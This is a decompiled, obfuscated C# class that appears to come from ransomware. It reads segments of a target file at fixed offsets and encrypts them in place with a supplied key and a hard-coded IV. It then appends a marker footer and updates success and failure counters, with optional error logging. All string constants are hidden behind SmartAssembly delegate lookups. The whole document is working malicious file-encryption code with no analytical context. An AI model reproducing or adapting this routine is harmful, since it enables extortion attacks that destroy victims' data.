using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using uchimBgrqYpC;

namespace FEPAnxLYcpgz;

internal sealed class XSXTcZbcAruUoR
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int MYGhVySRdbJxGG(long long_0)
	{
		return (int)long_0;
	}

	public static void QRyUQabAzKxWZaIo(string fhoLMDdyXbAt, string ySpMyCLgtELr, string FASReWcamvM, byte[] pYWakOjROiiLT = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(fhoLMDdyXbAt, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = MYGhVySRdbJxGG(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(ySpMyCLgtELr) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(ySpMyCLgtELr) * 1000 * 1000;
				}
				int yfgPMdjUknkz = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = CagsBNAuVkDdd(fhoLMDdyXbAt, fileStream, yfgPMdjUknkz, num * i);
					array = (frAELqEtncDC.geKzJTCQWBdPJrv ? VckDhBjKXWIr.jkEeFnuwqkjXhSz(byte_, Encoding.ASCII.GetBytes(FASReWcamvM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jpQAwiraQIs.yMRxObPGGIdX(byte_, Encoding.ASCII.GetBytes(FASReWcamvM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					fgIbEowVAkBPTC(fhoLMDdyXbAt, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (frAELqEtncDC.jHNjZakAkEHPd ? Encoding.ASCII.GetBytes(frAELqEtncDC.aTyvnaQgFklB(getString_0(107474185)) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475201)) + Convert.ToString(ySpMyCLgtELr) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475201))) : Encoding.ASCII.GetBytes(frAELqEtncDC.aTyvnaQgFklB(getString_0(107474185)) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475178)) + Convert.ToString(ySpMyCLgtELr) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475178))));
			if (!frAELqEtncDC.jHNjZakAkEHPd)
			{
				using FileStream fileStream2 = new FileStream(fhoLMDdyXbAt, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(fhoLMDdyXbAt, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(pYWakOjROiiLT, 0, pYWakOjROiiLT.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (frAELqEtncDC.fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(frAELqEtncDC.TVaVFXxrZtbC, getString_0(107462411) + fhoLMDdyXbAt + getString_0(107474204) + ex.Message + getString_0(107396324));
				}
				catch (Exception)
				{
				}
			}
			frAELqEtncDC.opDJfdSoJwBgd++;
		}
		frAELqEtncDC.LHsTakbnvLMZqfZlb++;
	}

	public static byte[] CagsBNAuVkDdd(string zGiZPDsNsuKev, FileStream JxrrOyfTSEmS, int yfgPMdjUknkz, int kZwJHroySDiWN = 0)
	{
		byte[] array = new byte[yfgPMdjUknkz];
		JxrrOyfTSEmS.Position = kZwJHroySDiWN;
		JxrrOyfTSEmS.Read(array, 0, yfgPMdjUknkz);
		return array;
	}

	public static void fgIbEowVAkBPTC(string NNYbSJcUkCZzNX, FileStream OtwLrZMunH, byte[] dqeRCOKczNlj, int XfQtUynvZgf = 0)
	{
		OtwLrZMunH.Position = XfQtUynvZgf;
		OtwLrZMunH.Write(dqeRCOKczNlj, 0, dqeRCOKczNlj.Length);
	}

	static XSXTcZbcAruUoR()
	{
		Strings.CreateGetStringDelegate(typeof(XSXTcZbcAruUoR));
	}
}
